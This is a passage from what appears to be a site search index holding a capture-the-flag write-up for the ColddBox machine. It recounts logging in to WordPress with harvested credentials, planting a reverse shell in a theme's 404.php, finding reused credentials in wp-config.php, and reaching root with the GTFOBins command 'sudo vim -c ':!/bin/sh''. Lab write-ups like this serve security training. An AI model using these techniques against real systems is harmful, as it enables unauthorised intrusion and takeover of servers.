2.909 MB\n[+] Data Received: 32.484 MB\n[+] Memory used: 304.16 MB\n[+] Elapsed time: 00:09:59\n</code></pre>"},{"location":"easy/colddbox/#initial-access","title":"Initial Access","text":"<p>Quickly, I directed to <code>/wp-login.php</code> to verify login with the harvested credentials -- c0ld:9876543210</p> <p></p> <p>After successfully logging in using the credentials for <code>c0ldd</code>, I edited the 404.php file in the appearance tab of the themes section to add a reverse shell. This allowed me to get my initial foothold into the web server. </p> <p></p> <p>I opened a listener on another tab and then opened the 404.php file in my browser. As a result, I gained access to the server with the <code>www-data</code> privilege.</p> <p> </p>"},{"location":"easy/colddbox/#privilege-escalation","title":"Privilege Escalation","text":""},{"location":"easy/colddbox/#gaining-user-access","title":"Gaining User access","text":"<p>As www-data, I didn't initially have access to any juicy information. However, I was able to run linpeas.sh, which helped me to find some credentials that were left in the wp-config.php file. </p> <p></p> <p>I copied the username and password and attempted to access the <code>3306</code> port that was running on <code>127.0.0.1</code> but had no luck. Finally, I tried using the same credentials to log in to the <code>c0ldd</code> account. This was a success, and I was able to escalate my privilege from <code>www-data</code> to <code>c0ldd</code>.</p>"},{"location":"easy/colddbox/#gaining-root-access","title":"Gaining Root access","text":"<p>As <code>c0ldd</code>, I ran sudo -l as I already knew his password. The output showed that Vim could be run as sudo.</p> <p></p> <p>With this knowledge, I was able to execute the command </p> <p>Sudo Command</p> <p><p><code>sudo vim -c ':!/bin/sh'</code></p></p> <p>from GTFOBINS. This allowed me to edit a file that was owned by root, thereby giving me access to the root user. As a result, I was able to escalate my privilege once again and become root.</p>"}]}